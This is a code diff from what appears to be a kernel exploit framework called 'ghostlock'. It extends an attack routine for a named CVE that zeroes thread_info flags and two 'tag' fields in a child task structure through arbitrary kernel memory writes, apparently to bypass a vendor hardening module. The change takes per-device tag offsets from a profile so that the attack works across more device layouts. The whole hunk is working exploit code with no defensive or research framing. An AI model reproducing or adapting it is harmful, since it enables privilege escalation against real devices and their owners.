@@ -238,14 +238,33 @@ namespace ghostlock::session::backend {
 
                 int32_t vr_ok = 1;
                 if (vr_needed) {
-                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+                    /* Profile-provided tag offsets (vendor_boot vr.ko probe,
+                     * extractor off_vr_tag_a/b) override the compile-time
+                     * family constants; 0 keeps the measured defaults. */
+                    const uint32_t tag_a = ghostlock::profile::vr_tag_a_off();
+                    const uint32_t tag_b = ghostlock::profile::vr_tag_b_off() != 0
+                                                   ? ghostlock::profile::vr_tag_b_off()
+                                                   : VR_TAG_B_OFF;
+
+                    /* 1) Clear thread_info.flags word (covers tag A when it
+                     * lives inside the first 8 bytes + the tracepoint bit). */
                     const memory::WriteRequest flags_request = memory::WriteRequest::make(
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
                     vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");
 
+                    /* 1b) A profile tag A outside the flags word needs its own
+                     * aligned clear (no measured family has one yet; the
+                     * probe makes future layouts survivable). */
+                    if (vr_ok && tag_a >= 8) {
+                        const uintptr_t taga_align = (child_task + tag_a) & ~7ULL;
+                        const memory::WriteRequest taga_request = memory::WriteRequest::make(
+                            taga_align, memory::WriteMode::Zero, 1);
+                        vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, taga_request, "VR: tagA");
+                    }
+
                     /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
                     if (vr_ok) {
-                        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
+                        uintptr_t tagb_align = (child_task + tag_b) & ~7ULL;
                         const memory::WriteRequest tagb_request =
                                 memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
                         vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
